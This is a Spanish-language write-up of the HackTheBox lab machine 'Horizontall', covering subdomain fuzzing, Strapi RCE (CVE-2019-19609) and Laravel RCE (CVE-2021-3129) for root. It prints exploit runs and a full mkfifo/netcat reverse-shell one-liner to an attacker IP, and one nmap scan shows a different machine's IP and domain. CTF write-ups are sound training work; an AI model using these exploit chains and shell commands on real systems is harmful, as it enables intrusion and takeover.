---
title: "Horizontall - HTB Writeup"
layout: single
excerpt: "Horizontall es una máquina de dificultad fácil de la plataforma de HackTheBox. En esta máquina accedemos inicialmente explotando un RCE del software Strapi, escalamos privilegios a superusuario explotando otro RCE de Laravel."
show_date: true
classes: wide
header:
  teaser: https://user-images.githubusercontent.com/67548295/152674909-42c5e610-ac52-410a-ad01-b33fcdf6fe70.png
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - Strapi
  - RCE
  - Laravel
  - Linux
---

![image](https://user-images.githubusercontent.com/67548295/152674999-404d8ead-c9ee-444f-8370-faf37c9874c5.png)

# Enumeración 


Arrancamos con la resolución de la máquina, antes de nada, enviamos un paquete [ICMP](https://es.wikipedia.org/wiki/Protocolo_de_control_de_mensajes_de_Internet){:target="\_blank"}{:rel="noopener nofollow"} a la máquina víctima con la herramienta `ping`, con esto veremos su estado y su **sistema operativo**:

```bash
┌──[z3r0byte@z3r0byte]─[~/CTF/HTB/Horizontall/content]
└──╼ $ ping -c 1 10.10.11.105
PING 10.10.11.105 (10.10.11.105) 56(84) bytes of data.
64 bytes from 10.10.11.105: icmp_seq=1 ttl=63 time=74.4 ms

--- 10.10.11.105 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 74.425/74.425/74.425/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Se puede ver que la máquina está **activa** y que observando el `TTL`, concluimos que es una máquina **Linux**.

Más información sobre la **detección de OS** mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

### Nmap

Seguimos enumerando el objetivo, hagámos un escaneo de puertos con la herramienta `nmap`

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ sudo nmap -p- --open -sS --min-rate 4000 -n 10.10.11.111 -sC -sV -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-12 12:35 WET
Nmap scan report for 10.10.11.111
Host is up (0.069s latency).
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://forge.htb
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.59 seconds
```
Vemos 2 puertos abiertos:

| Puerto | Servicio |
|:------:|:--------:|
| 22 | Corresponde al protocolo [SSH](https://www.hostinger.es/tutoriales/que-es-ssh){:target="\_blank"}{:rel="noopener nofollow"} |
| 80 | Este puerto pertenece al protocolo [HTTP](https://www.pickaweb.es/ayuda/que-es-http/){:target="\_blank"}{:rel="noopener nofollow"} |

# User.txt

Empezamos enumerando el puerto 80, empezaré usando `whatweb` para identificar las tecnologías usadas por el servidor:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ whatweb 10.10.11.105
http://10.10.11.105 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)],
IP[10.10.11.105], RedirectLocation[http://horizontall.htb], Title[301 Moved Permanently], nginx[1.14.0]
ERROR Opening: http://horizontall.htb - no address for horizontall.htb
```
Vemos que al apuntar a la IP, se nos redirije al dominio `horizontall.htb`. Tras ver esto, supuse que se estaba aplicando [Virtual Hosting](https://linube.com/ayuda/articulo/267/que-es-un-virtualhost){:target="\_blank"}{:rel="noopener nofollow"}

Así que añado este dominio al fichero `/etc/hosts`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ cat /etc/hosts
# Host addresses
127.0.0.1     localhost
127.0.1.1     z3r0byte
10.10.11.105  horizontall.htb
```
Ahora podremos ver las tecnologías del dominio al que nos redigía:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ whatweb 10.10.11.105
http://10.10.11.105 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)],
IP[10.10.11.105], RedirectLocation[http://horizontall.htb], Title[301 Moved Permanently], nginx[1.14.0]

http://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)],
IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]
```
Bien, por ahora nada relevante.

Visito el dominio con el navegador para ver la estructura de la página:

![image](https://user-images.githubusercontent.com/67548295/153713069-b9967bb4-dfff-4c0c-aa15-43eb93c17f29.png)

Y vemos varios botones clicables, pero ninguno de ellos funciona.

Uso un script de `nmap` para hacer una enumeración rápida de directorios:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ nmap -p80 --script "http-enum" 10.10.11.105 -oN webScan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-12 13:29 WET
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.069s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 157.87 seconds
```
Pero parece que no encontramos nada.

Pruebo ahora a enumerar subdominios con ayuda de `wfuzz`:

```bash
┌─[z3r0byte@z3r0byte]─[~]                                                                                                                                                             [11/11]
└──╼ $ wfuzz -c --hc=404 --hw=13 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.horizontall.htb" -u http://horizontall.htb -t 100                           
                                                                                                                                                                     
********************************************************                                                                                                                                     
* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                                                     
********************************************************                                                                                                                                     
                                                                                                                                                                                             
Target: http://horizontall.htb/                                                                                                                                                              
Total requests: 114441                                                                                                                                                                       
                                                                                                                                                                                             
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        1 L      43 W       901 Ch      "www"
000047093:   200        19 L     33 W       413 Ch      "api-prod" 

Total time: 0
Processed Requests: 112962
Filtered Requests: 112960
Requests/sec.: 0
```

| Parámetro | Acción |
|:---------:|:-------|
| `-c` | Reporta el output del programa con colores |
| `--hc` | Acrónimo de _hide code_ que sirve para ocultar respuestas según su código de estado |
| `--hw` | Acrónimo de _hide word_ el cual sirve para ocultar respuestas segun el número de palabras que contengan estas |
| `-w` | Este parámetro sirve para especificar un diccionario con el cual se _fuzzeará_ |
| `-H` | Con este parámetro, podemos especificar _headers_ para las peticiones |
| `-u` | Parámetro usado para especificar el target |
| `FUZZ` | Esta palabra la deberemos colocar donde queramos que la herramienta _fuzzee_ |
| `-t` | Este parametro hace referencia a la palabra _threads_ y sirve para enviar peticiones simultaneamente haciendo el _fuzzeo_ más rápido |

¡Encontramos un subdominio!, lo añadimos al archivo `/etc/hosts` para poder resolverlo:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ cat /etc/hosts
# Host addresses
127.0.0.1     localhost
127.0.1.1     z3r0byte
10.10.11.105  horizontall.htb api-prod.horizontall.htb
```
Visitemos con el navegador este subdominio:

![image](https://user-images.githubusercontent.com/67548295/153745669-c72397c4-5469-43c0-b4d4-de7784239b00.png)

Vemos un simple encabezado poniendo "_Welcome_"

Intento enumerar las tecnologías que usa el subdominio con la extension de navegador `Wappalyzer`:

![image](https://user-images.githubusercontent.com/67548295/153745839-2b7b0e8b-893c-4952-acbe-dd9612defe34.png)

Y vemos que se usa el gestor de contenidos [Strapi](https://medium.com/orbit-software/crea-una-api-con-strapi-y-node-js-en-minutos-7b23f7a15e99){:target="\_blank"}{:rel="noopener nofollow"}, que es un software diseñado para crear APIs.

Viendo esto, sin saber la versión, me atrevo a buscar vulnerabilidades de este servicio.

Encuentro esto y me llama la atención:

![image](https://user-images.githubusercontent.com/67548295/153747276-eec348ec-945e-4349-bb55-42f70eea9cfd.png)

Reviso el código y parece ser un exploit en python que explota una vulnerabilidad de ejecución remota de comandos.

También me logro dar cuenta de que el exploit contiene una función donde chequea la versión del servicio con una petición GET.

![image](https://user-images.githubusercontent.com/67548295/153747438-aa163f86-907c-44a3-a137-711435cdbb44.png)

Se hace una petición GET al recurso `/admin/init`, bien, probemos a hacer esto con `curl`

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl -s http://api-prod.horizontall.htb/admin/init | jq
{
  "data": {
    "uuid": "a55da3bd-9693-4a08-9279-f9df57fd1817",
    "currentEnvironment": "development",
    "autoReload": false,
    "strapiVersion": "3.0.0-beta.17.4"
  }
}
```
Y vemos que logramos ver la versión, la cual encaja con la de la vulnerabilidad.

Así que descargo el exploit y lo pruebo en mi máquina.

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ wget https://www.exploit-db.com/raw/50239 -O Strapi-RCE-exploit.py 
--2022-02-13 09:46:38--  https://www.exploit-db.com/raw/50239
Resolviendo www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Conectando con www.exploit-db.com (www.exploit-db.com)[192.124.249.13]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2509 (2,5K) [text/plain]
Grabando a: «Strapi-RCE-exploit.py»

Strapi-RCE-exploit.py                           100%[====================================================================================================>]   2,45K  --.-KB/s    en 0s      

2022-02-13 09:46:38 (21,2 MB/s) - «Strapi-RCE-exploit.py» guardado [2509/2509]

┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ python3 Strapi-RCE-exploit.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQ0NzQ1NTI5LCJleHAiOjE2NDczMzc1Mjl9.qGtTqJo6fEFpwo8Wc5mo1HM5XOev-9A_fBntB_wk6j0


$> whoami
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
```
Como podemos apreciar, el exploit es funcional hasta que intento ejecutar comandos. 

Asi que busco otro exploit funcional.

Encuentro un POC en github que tiene buena pinta

   - [CVE-2019-19609 Exploit](https://github.com/diego-tella/CVE-2019-19609-EXPLOIT){:target="\_blank"}{:rel="noopener nofollow"}

Descargo el exploit y lo pruebo:

```bash
┌──[z3r0byte@z3r0byte]─[~]
└──╼ $ python3 exploit.py 
usage: exploit.py [-h] -d DOMAIN -jwt JWTOKEN -l LHOST -p PORT
exploit.py: error: the following arguments are required: -d/--domain, -jwt/--jwtoken, -l/--lhost, -p/--port
```
Se nos piden varios argumentos, entre los cuales está el `jwt`.

Para conseguir este, podemos ejecutar el exploit anterior para conseguirlo.

Hagamos esto:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ python3 Strapi-RCE-exploit.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQ0NzQ5MTEzLCJleHAiOjE2NDczNDExMTN9.pG1hWSnRYY09YI3DHXUaiHEgpjrOkBuHtK8XoDuqY_o


$> Traceback (most recent call last):
  File "/home/z3r0byte/Strapi-RCE-exploit.py", line 74, in <module>
    terminal.cmdloop()
  File "/usr/lib/python3.9/cmd.py", line 126, in cmdloop
    line = input(self.prompt)
KeyboardInterrupt

┌─[✗]─[z3r0byte@z3r0byte]─[~]
└──╼ $ python3 exploit.py -d api-prod.horizontall.htb -jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQ0NzQ5MTEzLCJleHAiOjE2NDczNDExMTN9.pG1hWSnRYY09YI3DHXUaiHEgpjrOkBuHtK8XoDuqY_o  -l 10.10.14.45 -p 9001
[+] Exploit for Remote Code Execution for strapi-3.0.0-beta.17.7 and earlier (CVE-2019-19609)
[+] Remember to start listening to the port 9001 to get a reverse shell
[+] Sending payload... Check if you got shell
```
Y por el otro lado recibimos la shell

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.105 42468
/bin/sh: 0: can't access tty; job control turned off
$ 
```
Una vez en este punto, podremos ver la flag `user.txt` en la ruta `/home/developer/user.txt` (Muestro únicamente los 11 primeros carácteres):

```bash
strapi@horizontall:~$ head --bytes 11 /home/developer/user.txt | xargs 
dc71e777266
```

# Root.txt

Después de haber ganado acceso al equipo con bajos privilegios, es turno de la fase de escalada de privilegios.

Enumero un poco la máquina y me doy cuenta de que hay puertos abiertos internamente:

```bash
strapi@horizontall:~$ netstat -lt4 | grep localhost
tcp        0      0 localhost:1337          0.0.0.0:*               LISTEN     
tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN     
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN
```
Vemos 3 puertos abiertos de forma interna:

El primero que distinguimos es el `1337`. 

Hago una petición GET con `curl` a este puerto para ver lo que contiene

```bash
strapi@horizontall:/$ curl 127.0.0.1:1337
<!doctype html>

<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <title>Welcome to your API</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
    </style>
  </head>
  <body lang="en">
    <section>
      <div class="wrapper">
        <h1>Welcome.</h1>
      </div>
    </section>
  </body>
</html>
```
Como vemos, este puerto parece ser el de la API que vimos antes, así que veamos que contiene el otro puerto, el `8000`.

```bash
strapi@horizontall:/$ curl -s 127.0.0.1:8000

[...]

                    <div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
                            Laravel v8 (PHP v7.4.18)
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
```
Parece ser que hay una web de forma interna en este puerto.

Hago un [Port Forwarding](https://nordvpn.com/es/blog/que-es-port-forwarding/){:target="\_blank"}{:rel="noopener nofollow"} para que este puerto sea accesible desde mi máquina, uso `chisel`.

Clonamos el repositorio de `chisel` y compilamos el binario:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ git clone https://github.com/jpillora/chisel
Clonando en 'chisel'...
remote: Enumerating objects: 2048, done.
remote: Counting objects: 100% (164/164), done.
remote: Compressing objects: 100% (102/102), done.
remote: Total 2048 (delta 96), reused 80 (delta 57), pack-reused 1884
Recibiendo objetos: 100% (2048/2048), 3.43 MiB | 6.99 MiB/s, listo.
Resolviendo deltas: 100% (962/962), listo.
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ cd chisel/
┌─[z3r0byte@z3r0byte]─[~/Descargas/chisel]
└──╼ $ go build -ldflags "-s -w" .
```
Ahora tendremos que transferir el binario a la máquina víctima, yo lo haré montando un servidor HTTP con python:

![image](https://user-images.githubusercontent.com/67548295/153751601-97ef53b9-7c58-4428-91c2-01b627097f7b.png)

Y establecemos un `port forwarding`:

![image](https://user-images.githubusercontent.com/67548295/153751947-6323d32a-65b5-436e-ae72-986e38ceb2a6.png)

Ahora tendremos conectividad con el puerto `8000` interno en nuestra máquina.

---

Bien, visito este servicio web con el navegador, accederemos apuntando a `localhost:8080`

![image](https://user-images.githubusercontent.com/67548295/153752289-6a45bf79-4e5f-47d5-9f28-133ed7e40143.png)

Vale, Laravel. Si nos fijamos bien podremos ver que se expone la versión abajo a la derecha

Sabiendo la versión podremos intentar buscar vulnerabilidades asociadas a la misma, asi que busco en Internet.

Encuentro un exploit que asegura ejecución remota de comandos para esta versión.

   - [CVE-2021-3129_exploit](https://github.com/nth347/CVE-2021-3129_exploit){:target="\_blank"}{:rel="noopener nofollow"}

Clono el repositorio y pruebo a ejecutar el exploit basandome en el ejemplo que se adjunta.

```bash
┌─[✗]─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ git clone https://github.com/nth347/CVE-2021-3129_exploit
Clonando en 'CVE-2021-3129_exploit'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 1), reused 3 (delta 0), pack-reused 0
Recibiendo objetos: 100% (9/9), listo.
Resolviendo deltas: 100% (1/1), listo.
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ cd CVE-2021-3129_exploit/     
┌─[z3r0byte@z3r0byte]─[~/Descargas/CVE-2021-3129_exploit]
└──╼ $ python3 exploit.py http://localhost:8000 Monolog/RCE1 id
[i] Trying to clear logs
[+] Logs cleared
[i] PHPGGC not found. Cloning it
Clonando en 'phpggc'...
remote: Enumerating objects: 2822, done.
remote: Counting objects: 100% (1164/1164), done.
remote: Compressing objects: 100% (673/673), done.
remote: Total 2822 (delta 476), reused 987 (delta 338), pack-reused 1658
Recibiendo objetos: 100% (2822/2822), 416.99 KiB | 1.65 MiB/s, listo.
Resolviendo deltas: 100% (1118/1118), listo.
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=0(root) gid=0(root) groups=0(root)

[i] Trying to clear logs
[+] Logs cleared
```
¡Funciona, y además ejecutamos comandos como root!

Probemos a ver si podemos entablar una reverse shell. Nos ponemos en escucha con netcat y ejecutamos el exploit.

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/CVE-2021-3129_exploit]
└──╼ $ python3 exploit.py http://localhost:8000 Monolog/RCE1 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.45 4444 >/tmp/f'
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
```
¡Recibimos una shell como root!

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/CVE-2021-3129_exploit]
└──╼ $ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.105 37910
/bin/sh: 0: can't access tty; job control turned off
#
```
Ya habiendo escalado privilegios, podremos ver la flag `root.txt` en `/root/root.txt`:

```
# head --bytes 11 /root/root.txt | xargs
64a456cedd3
```
---









